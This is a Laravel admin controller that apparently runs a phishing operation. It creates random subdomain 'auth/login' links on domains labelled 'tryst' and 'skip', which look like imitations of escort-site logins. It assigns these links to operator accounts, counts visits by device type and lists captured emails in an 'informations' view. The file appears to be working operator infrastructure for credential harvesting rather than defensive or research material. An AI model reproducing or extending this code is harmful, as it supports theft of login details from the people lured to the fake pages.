<?php

namespace App\Http\Controllers;

use App\Events\MyEvent;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
class AdminController extends Controller
{
    function index(){
               $websites = DB::table('domains')->get();
        $domains = DB::table('domains')->count();
        $emails = DB::table('emails')->where('email','!=','')->count();
        $click = DB::table('domains')
            ->sum('domains.click');
            $mobile = DB::table('domains')
            ->sum('domains.mobile');
            $tablet = DB::table('domains')
            ->sum('domains.tablet');
            $desktop = DB::table('domains')
            ->sum('domains.desktop');
        return view('auth.dashboards.admins.index',compact('domains','emails','click','websites','mobile','tablet','desktop'));
    }
    function websites(){
        $websites = DB::table('domains')->where('user_id','!=',0)->get();
        return view('auth.dashboards.admins.websites',compact('websites'));
    }
    function create(){
        return view('auth.dashboards.admins.create');
    }

    function save(Request $request){

        $check = DB::table('domains')->where('domain',$request->website)->where('subdomain',Str::lower($request->name))->count();

        if ($check > 0){
            return redirect()->back()->with('error','Link Already Exists :(:( --->>> Try with new link');
        }else{
            $data['domain'] = $request->website;
            $data['subdomain'] = Str::lower($request->name);
            $data['path'] = 'auth/login';
            $data['user_id'] = 0;

            DB::table('domains')->insert($data);

            return redirect()->back()->with('success','Link Added Successfully :):)');
        }


    }
    function new_user(){
        return view('auth.dashboards.admins.new_user');
    }
    function user_save(Request $request){



        $validated = $request->validate([
            'name' =>['required','string','max:255'],
            'email' =>['required','string','email','max:255','unique:users'],
            'password' =>['required','string'],

        ]);

        if ($validated){
            $user = new User();
            $user->name = $request->name;
            $user->email = $request->email;
            $user->password =\Hash::make($request->password);
            $user->role = 2;

            $user->save();

            $check = DB::table('users')->where('email',$request->email)->first();


            // for ($i = 0;$i<1;$i++){

            //         $data['domain'] = 'skip';
            //         $data['subdomain'] = rand(1111,9999);
            //         $data['path'] = 'auth/login';
            //         $data['user_id'] = $check->id;

            //         DB::table('domains')->insert($data);
            // }
            // for ($i = 0;$i<1;$i++){

            //         $data['domain'] = 'skip';
            //         $data['subdomain'] = rand(1111,9999);
            //         $data['path'] = 'live/chat';
            //         $data['user_id'] = $check->id;

            //         DB::table('domains')->insert($data);
            // }
            for ($i = 0;$i<3;$i++){

                    $data['domain'] = 'tryst';
                    $data['subdomain'] = rand(1111,9999);
                    $data['path'] = 'auth/login';
                    $data['user_id'] = $check->id;

                    DB::table('domains')->insert($data);
            }
            // for ($i = 0;$i<5;$i++){

            //         $data['domain'] = 'skip';
            //         $data['subdomain'] = rand(1111,9999);
            //         $data['path'] = 'live/chat';
            //         $data['user_id'] = $check->id;

            //         DB::table('domains')->insert($data);
            // }

            return redirect()->back()->with('success','User Added Sucessfully');

        }else{
            return redirect()->back()->with('error','Already Exists :(:( --->>> Try');
        }




    }
    function user_all(){
        $users = DB::table('users')->where('role','!=',1)->get();
        return view('auth.dashboards.admins.all-user',compact('users'));
    }

    public function userdelete($id){
        DB::table('users')->where('id',$id)->delete();
        $test = DB::table('domains')->where('user_id',$id)->get();
        foreach ($test as $test){
            $data = array();
            $data['user_id'] = 0;
            DB::table('domains')->where('user_id',$test->user_id)->update($data);

        }



        $noti = array(
            'message'=>'User Deleted',
            'alert-type'=>'success'
        );
        return redirect()->back()->with($noti);
    }
    public function infodelte($id){
        DB::table('emails')->where('id',$id)->delete();




        $noti = array(
            'message'=>'User Deleted',
            'alert-type'=>'success'
        );
        return redirect()->back()->with($noti);
    }



    function give($id){
        $user = DB::table('users')->where('id',$id)->first();
        $domains  = DB::table('domains')->where('user_id',0)->get();

        //return response()->json($domains);
        return view('auth.dashboards.admins.give',compact('user','domains'));
    }
    function assignlink(Request $request){
        $datas =array();
        $datas['user_id'] = $request -> id;
        //link hocce domain tale ar id
        $data = $request->link;
        DB::table('domains')->where('id',$data)->update($datas);
        $noti = array(
            'message'=>'Link Added Successfully',
            'alert-type'=>'success'
        );
        return redirect()->back()->with($noti);
    }

    function informations(){
$informations = DB::table('emails')
        ->join('users','emails.user-id','users.id')
        ->where('emails.email','!=','')
        ->orderBy('emails.id','desc')
        ->select('emails.*','users.name')
        ->get();
        return view('auth.dashboards.admins.informations',compact('informations'));
    }
    function settings(){
        return view('auth.dashboards.admins.all-user');
    }

    function update_click(){
        $datas['click'] = 0;
        $datas['desktop'] = 0;
        $datas['mobile'] = 0;
        $datas['tablet'] = 0;

        $check = DB::table('domains')->update($datas);

        if($check){
            echo "successful";
        }else{
            echo "wrong";
        }
    }
    function test(){
        event(new MyEvent('hello world'));
    }
}
